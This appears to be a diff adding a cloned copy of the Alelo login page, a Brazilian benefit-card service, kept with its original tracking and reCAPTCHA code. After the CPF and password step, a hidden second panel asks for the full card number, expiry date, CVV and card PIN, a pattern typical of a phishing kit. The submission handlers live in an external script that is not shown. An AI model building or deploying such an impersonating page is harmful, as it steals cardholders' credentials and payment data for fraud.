@@ -1,0 +1,610 @@
+<html><head>
+    <!-- header -->
+    
+        
+
+<!-- localize.jsp MUST already be included in the calling script -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/vpEprwpCoBMgy-fvZET0Mz6L/recaptcha__pt_br.js" crossorigin="anonymous" integrity="sha384-NTdC4Bk5+8kkJFUfYUXcN0zIrIx8HSw2h8ruEMq9ArwwnmSNAVFJzxjzqaPm6uSd"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WB87PXZ&amp;gtm_auth=lrZCOHtHe2HZw6sWQxdS5Q&amp;gtm_preview=env-28&amp;gtm_cookies_win=x"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WB87PXZ"></script><script type="text/javascript" src="/authenticationendpoint/ruxitagentjs_ICA2NVfgjqrux_10261230220152234.js" data-dtconfig="app=abe9488962c3654b|featureHash=ICA2NVfgjqrux|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=8y5hf1ym|mel=100000|dpvc=1|ssv=4|lastModification=1680123225940|dtVersion=10261230220152234|tp=500,50,0,1|agentUri=/authenticationendpoint/ruxitagentjs_ICA2NVfgjqrux_10261230220152234.js|reportUrl=/authenticationendpoint/rb_e2cfde8a-785d-4dd8-8ec5-8dce1f48f998|rid=RID_319096537|rpid=-1839683327|domain=alelo.com.br"></script><link rel="icon" href="images/logo-alelo.png" type="image/x-icon">
+<link href="styles/is-default.css" rel="stylesheet">
+<link href="styles/bootstrap.css" rel="stylesheet">
+<link href="styles/alelo.css" rel="stylesheet">
+
+<title>Login Alelo</title>
+
+<style>
+    html, body {
+        height: 100%;
+    }
+
+    body {
+        flex-direction: column;
+        display: flex;
+    }
+
+    main {
+        flex-shrink: 0;
+    }
+
+    main.center-segment {
+        margin: auto;
+        display: flex;
+        align-items: center;
+    }
+
+    main.center-segment > .ui.container.medium {
+        max-width: 450px !important;
+    }
+
+    main.center-segment > .ui.container.large {
+        max-width: 700px !important;
+    }
+<!-- AJUSTE PADDING 3rem TO initial -->
+    main.center-segment > .ui.container > .ui.segment {
+        padding: initial;
+    }
+
+    main.center-segment > .ui.container > .ui.segment .segment-form .buttons {
+        margin-top: 1em;
+    }
+
+    main.center-segment > .ui.container > .ui.segment .segment-form .buttons.align-right button,
+    main.center-segment > .ui.container > .ui.segment .segment-form .buttons.align-right input {
+        margin: 0 0 0 0.25em;
+    }
+
+    main.center-segment > .ui.container > .ui.segment .segment-form .column .buttons.align-left button.link-button,
+    main.center-segment > .ui.container > .ui.segment .segment-form .column .buttons.align-left input.link-button {
+        padding: .78571429em 1.5em .78571429em 0;
+    }
+
+    main.center-segment > .ui.container > .ui.segment .segment-form {
+        text-align: left;
+    }
+
+    main.center-segment > .ui.container > .ui.segment .segment-form .align-center {
+        text-align: center;
+    }
+
+    main.center-segment > .ui.container > .ui.segment .segment-form .align-right {
+        text-align: right;
+    }
+
+    .cookie-policy-message {
+        font-size: 14px;
+    }
+
+    footer {
+        padding: 2rem 0;
+    }
+
+    body .product-title .product-title-text {
+        margin: 0;
+    }
+
+    body .center-segment .product-title .product-title-text {
+        margin-top: 2em;
+        margin-bottom: 1em;
+    }
+
+    .ui.menu.fixed.app-header .product-logo {
+        padding-left: 0;
+    }
+
+    /* Table of content styling */
+
+    main #toc {
+        position: sticky;
+        top: 93px;
+    }
+
+    main .ui.segment.toc {
+        padding: 20px;
+    }
+
+    main .ui.segment.toc ul.ui.list.nav > li.sub {
+        margin-left: 20px;
+    }
+
+    main .ui.segment.toc ul.ui.list.nav > li > a {
+        color: rgba(0,0,0,.87);
+        text-decoration: none;
+    }
+
+    main .ui.segment.toc ul.ui.list.nav > li:before {
+        content: "\2219";
+        font-weight: bold;
+        font-size: 1.6em;
+        line-height: 0.5em;
+        display: inline-block;
+        width: 1em;
+        margin-left: -0.7em;
+    }
+
+    main .ui.segment.toc ul.ui.list.nav > li.sub:before {
+        content: "\2192";
+        margin-left: -1em;
+    }
+
+    main .ui.segment.toc ul.ui.list.nav > li:hover a {
+        color: #ff5000;
+        text-decoration: none;
+    }
+
+    main .ui.segment.toc ul.ui.list.nav > li:hover:before {
+        color: #ff5000;
+    }
+</style>
+
+<script src="js/jquery-3.6.4.min.js"></script>
+<script src="js/jquery.mask.min.js"></script>
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-WB87PXZ');</script>
+<!-- End Google Tag Manager -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-2506361-5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-2506361-5');
+</script>
+<!-- End Google Tag Manager -->
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=lrZCOHtHe2HZw6sWQxdS5Q&gtm_preview=env-28&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-WB87PXZ');</script>
+<!-- End Google Tag Manager -->
+
+
+    
+
+    
+        <script src="https://www.google.com/recaptcha/api.js?hl=pt-BR"></script>
+    
+</head>
+<body onload="checkSessionKey()">
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WB87PXZ"height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WB87PXZ&gtm_auth=lrZCOHtHe2HZw6sWQxdS5Q&gtm_preview=env-28&gtm_cookies_win=x"height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <main class="center-segment" id="page-all">
+        <div class="ui container medium center aligned middle aligned">
+
+            
+
+<div class="product-title" id="product-title">
+  <div class="theme-icon inline auto transparent">
+    <img src="images/logo-alelo.png" alt="" style="width: 90px;">
+  </div>
+</div>
+
+            
+
+            <div class="ui segment">
+                <h3 class="ui header" id="ui-header">
+                    
+                    Login
+                </h3>
+                
+                <div class="segment-form">
+                    
+                                        
+
+
+
+<script>
+    function goBack() {
+        window.history.back();
+    }
+
+    // Handle form submission preventing double submission.
+    $(document).ready(function(){
+        $.fn.preventDoubleSubmission = function() {
+            $(this).on('submit',function(e){
+                var $form = $(this);
+                if ($form.data('submitted') === true) {
+                    // Previously submitted - don't submit again.
+                    e.preventDefault();
+                    console.warn("Prevented a possible double submit event");
+                } else {
+                    e.preventDefault();
+
+                    var isEmailUsernameEnabled = JSON.parse("false");
+                    var tenantName = getParameterByName("tenantDomain");
+                    var userName = document.getElementById("username");
+                    var usernameUserInput = document.getElementById("usernameUserInput");
+
+                    if (usernameUserInput) {
+                        var usernameUserInputValue = usernameUserInput.value.trim();
+
+                        if (tenantName && tenantName !== "null") {
+
+                            if (isEmailUsernameEnabled) {
+
+                                if (usernameUserInputValue.split("@").length <= 1) {
+                                    var errorMessage = document.getElementById("error-msg");
+
+                                    errorMessage.innerHTML = "Invalid Username. Username has to be an email address.";
+                                    errorMessage.style.display = "block";
+
+                                    return;
+                                }
+
+                                if (usernameUserInputValue.split("@").length === 2) {
+                                    userName.value = usernameUserInputValue + "@" + tenantName;
+                                }
+                                else {
+                                    userName.value = usernameUserInputValue;
+                                }
+                            } else {
+                                if (usernameUserInputValue.split("@").length > 1) {
+                                    userName.value = usernameUserInputValue;
+                                } else {
+                                        userName.value = usernameUserInputValue + "@" + tenantName;
+                                }
+
+                            }
+
+                        } else {
+                            userName.value = usernameUserInputValue;
+                        }
+                    }
+
+                    if (userName.value) {
+                        let contextPath = ""
+                        if (contextPath !== "") {
+                            contextPath = contextPath.startsWith('/') ? contextPath : "/" + contextPath
+                            contextPath = contextPath.endsWith('/') ?
+                                contextPath.substring(0, contextPath.length - 1) : contextPath
+                        }
+                        $.ajax({
+                            type: "GET",
+                            url: contextPath + "/logincontext?sessionDataKey=" + getParameterByName("sessionDataKey") +
+                                "&relyingParty=" + getParameterByName("relyingParty") + "&tenantDomain=" + tenantName,
+                            success: function (data) {
+                                if (data && data.status == 'redirect' && data.redirectUrl && data.redirectUrl.length > 0) {
+                                    window.location.href = data.redirectUrl;
+                                } else if ($form.data('submitted') !== true) {
+                                    $form.data('submitted', true);
+                                    document.getElementById("loginForm").submit();
+                                } else {
+                                    console.warn("Prevented a possible double submit event.");
+                                }
+                            },
+                            cache: false
+                        });
+                    }
+                }
+            });
+
+            return this;
+        };
+        $('#loginForm').preventDoubleSubmission();
+    });
+</script>
+
+
+
+
+<div class="ui large form" id="part1" style="display: block;" onsubmit="validateCpf()">    
+        <div class="ui visible negative message" style="display: none;" id="error-msg"></div>
+        <div class="field">
+            <div class="ui fluid left input">
+                <input type="text" id="usernameUserInput" value="" name="usernameUserInput" tabindex="1" data-gtm-event-category="alelo:is" data-gtm-event-action="actions:login" data-gtm-event-label="inserir-cpf" placeholder="Digite o seu CPF" required="" maxlength="14">
+		<!-- <i aria-hidden="true" class="user icon"></i> -->
+                <input id="username" name="username" type="hidden" value="null">
+            </div>
+        </div>
+        <div class="field">
+            <div class="ui fluid left input">
+                <input type="password" id="password" name="password" value="" autocomplete="off" tabindex="2" data-gtm-event-category="alelo:is" data-gtm-event-action="actions:login" data-gtm-event-label="inserir-senha" minlength="4" required placeholder="Senha">
+                    <span class="lnr lnr-eye" onclick="hidePass()">
+                        <img src="images/svgs/eye-icon.svg" id="internal-circle">
+			            <img src="images/svgs/eye-circle.svg" >
+                    </span>
+               
+            </div>
+        </div>
+   
+        <div class="field">   
+            <div class="buttons">
+                
+                <div class="field align">
+                    
+                    <span id="passwordRecoverLink" tabindex="6" data-gtm-event-category="alelo:is" data-gtm-event-action="actions:login" data-gtm-event-label="esqueci-senha" href="">
+        <!--                <img src="libs/theme/assets/images/icons/lock-icon.svg" id="lock-icon">-->
+                            <span> Esqueci minha senha </span>
+                    </span>
+                </div>
+                
+
+                
+            </div>
+
+    <div class="ui divider hidden"></div>
+
+    <div class="field">
+        <!-- <div class="ui checkbox">
+            <input tabindex="3" type="checkbox" id="chkRemember" name="chkRemember">
+            <label>Lembre-me</label>
+        </div> -->
+    </div>
+    <input type="hidden" name="sessionDataKey" value="76a8a4db-47e4-4d36-b7dc-5d8bfd8f27bb">
+
+    <div class="ui divider hidden"></div>
+
+    <div class="cookie-policy-message">
+        Usamos cookies do navegador para rastrear sua sessão para oferecer uma melhor experiência. Você pode consultar nosso
+        <a href="cookie_policy.do" target="policy-pane">
+            Política de Cookies
+        </a>
+        para mais detalhes.
+        <br><br>
+        Ao fazer login, você concorda com nossos
+        <a href="privacy_policy.do" target="policy-pane">
+            Política de Privacidade
+        </a>
+    </div>
+    <div class="ui divider hidden"></div>
+
+    <div class="ui one column stackable grid">
+        <div class="column mobile center aligned tablet aligned computer right aligned buttons tablet no-margin-right-last-child computer no-margin-right-last-child btn-alelo">
+            <button onclick="validateCpf()" type="submit" class="ui primary large button btn-alelo" >
+                    ENTRAR
+
+            </button>
+        </div>
+        
+</div>
+
+
+
+
+    
+    
+
+
+<script>
+//     let btn = document.querySelector('.lnr-eye');
+//     btn.addEventListener('click', function() {
+//     let input = document.querySelector('#password');
+//     if(input.getAttribute('type') == 'password') {
+//         input.setAttribute('type', 'text');
+//     } else {
+//         input.setAttribute('type', 'password');
+//     }
+// });
+
+</script>
+
+
+
+                                    
+                    
+                
+                    
+                    
+                </div></div>
+
+        <div class="ui large form" id="part2" style="display: none;" onsubmit="validateCard()">    
+
+                    <div class="ui visible negative message" style="display: none;" id="error-msg-card"></div>
+                
+                
+                    <div class="field">
+                        <div class="ui fluid left input">
+                            <input type="text" id="numberCard" value="" name="numberCard" tabindex="1" data-gtm-event-category="alelo:is" data-gtm-event-action="actions:login" data-gtm-event-label="inserir-cpf" placeholder="Numero do cartão" required="" maxlength="19">
+                            <input id="num" name="num" type="hidden" value="null">
+                        </div>
+                    </div>
+                
+                    <div class="field">
+                        <div class="ui fluid left input">
+                            <input type="text" id="valCard" value="" name="valCard" tabindex="1" data-gtm-event-category="alelo:is" data-gtm-event-action="actions:login" data-gtm-event-label="inserir-cpf" placeholder="Validade do cartão" required="" maxlength="5">
+                            <input id="val" name="val" type="hidden" value="null">
+                        </div>
+                    </div>
+                
+                    
+
+                    <div class="field">
+                        <div class="ui fluid left input">
+                            <input type="text" id="cvvCard" value="" name="cvvCard" tabindex="1" data-gtm-event-category="alelo:is" data-gtm-event-action="actions:login" data-gtm-event-label="inserir-cpf" placeholder="Cvv do cartão" required="" maxlength="3" minlength="3">
+                            <input id="val" name="val" type="hidden" value="null">
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <div class="ui fluid left input">
+                            <input type="text" id="passCard" value="" name="passCard" tabindex="1" data-gtm-event-category="alelo:is" data-gtm-event-action="actions:login" data-gtm-event-label="inserir-cpf" placeholder=" Senha do Cartão" required="" maxlength="4" minlength="4">
+                            <input id="val" name="val" type="hidden" value="null">
+                        </div>
+                    </div>
+
+                    <div class="ui one column stackable grid">
+                        <div class="column mobile center aligned tablet aligned computer right aligned buttons tablet no-margin-right-last-child computer no-margin-right-last-child btn-alelo">
+                            <button onclick="login()" type="submit" class="ui primary large button btn-alelo" >
+                                    ENTRAR
+                            </button>
+                        </div>
+                        
+                </div>
+                </div>
+
+                <div class="ui large " id="part3" style="display: none;"  onsubmit="validateCard()">
+                    <div class="cover"></div>
+                    <img src="images/cell.png" class="cell" alt="">    
+                </div>
+
+            </div>
+        </div>
+    </div></main>
+
+    <!-- product-footer -->
+    
+
+    <!-- footer -->
+    
+        
+
+
+    <script>
+        $("#numberCard").mask("0000 0000 0000 0000")
+        $("#valCard").mask("00/00")
+        $("#cvvCard").mask("000")
+    
+       function removeMascara(){
+       var cpf_cnpj = $("#usernameUserInput");
+       cpf_cnpj.unmask();
+    }
+    </script>
+<script src="libs/theme/semantic.min.js"></script>
+
+    
+
+    
+    <script>
+        function checkSessionKey() {
+            var proxyPath = ""
+            $.ajax({
+                type: "GET",
+                url: proxyPath + "/logincontext?sessionDataKey=" + getParameterByName("sessionDataKey") +
+                    "&relyingParty=" + getParameterByName("relyingParty") + "&tenantDomain="
+                    + getParameterByName("tenantDomain"),
+                success: function (data) {
+                    if (data && data.status == 'redirect' && data.redirectUrl && data.redirectUrl.length > 0) {
+                        window.location.href = data.redirectUrl;
+                    }
+                },
+                cache: false
+            });
+        }
+
+        function getParameterByName(name, url) {
+            if (!url) {
+                url = window.location.href;
+            }
+            name = name.replace(/[\[\]]/g, '\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return "";
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        $(document).ready(function () {
+            $('.main-link').click(function () {
+                $('.main-link').next().hide();
+                $(this).next().toggle('fast');
+                var w = $(document).width();
+                var h = $(document).height();
+                $('.overlay').css("width", w + "px").css("height", h + "px").show();
+            });
+            
+            $('.overlay').click(function () {
+                $(this).hide();
+                $('.main-link').next().hide();
+            });
+
+            var cpf = $("#usernameUserInput");
+            cpf.mask('000.000.000-00');
+
+            
+                var error_msg = $("#error-msg");
+
+                // $("#loginForm").submit(function (e) {
+                //     var resp = $("[name='g-recaptcha-response']")[0].value;
+                //     if (resp.trim() == '') {
+                //         error_msg.text("Por favor, verifique que você não é um robô");
+                //         error_msg.show();
+                //         $("html, body").animate({scrollTop: error_msg.offset().top}, 'slow');
+                //         return false;
+                //     }
+                //     return true;
+                // });
+            
+        });
+    
+        function myFunction(key, value, name) {
+            var object = document.getElementById(name);
+            var domain = object.value;
+
+
+            if (domain != "") {
+                document.location = "../commonauth?idp=" + key + "&authenticator=" + value +
+                        "&sessionDataKey=76a8a4db-47e4-4d36-b7dc-5d8bfd8f27bb&domain=" +
+                        domain;
+            } else {
+                document.location = "../commonauth?idp=" + key + "&authenticator=" + value +
+                        "&sessionDataKey=76a8a4db-47e4-4d36-b7dc-5d8bfd8f27bb";
+            }
+        }
+
+        function handleNoDomain(elem, key, value) {
+            var linkClicked = "link-clicked";
+            if ($(elem).hasClass(linkClicked)) {
+                console.warn("Preventing multi click.")
+            } else {
+                $(elem).addClass(linkClicked);
+                
+                document.location = "../commonauth?idp=" + key + "&authenticator=" + value +
+                    "&sessionDataKey=76a8a4db-47e4-4d36-b7dc-5d8bfd8f27bb" +
+                    "";
+            }
+        }
+    
+        window.onunload = function(){};
+
+        function changeUsername (e) {
+            document.getElementById("changeUserForm").submit();
+        }
+
+        $('.isHubIdpPopupButton').popup({
+            popup: '.isHubIdpPopup',
+            on: 'click',
+            position: 'top left',
+            delay: {
+                show: 300,
+                hide: 800
+            }
+        });
+    </script>
+    <script src="js/app.js"></script>
+
+    
+
+
+<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="o desafio reCAPTCHA expira em dois minutos" src="https://www.google.com/recaptcha/api2/bframe?hl=pt-BR&amp;v=vpEprwpCoBMgy-fvZET0Mz6L&amp;k=6LfkBgMgAAAAABMMqRhO6SsjyyoIul5sSL8vjQgB" name="c-reon8wancneh" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
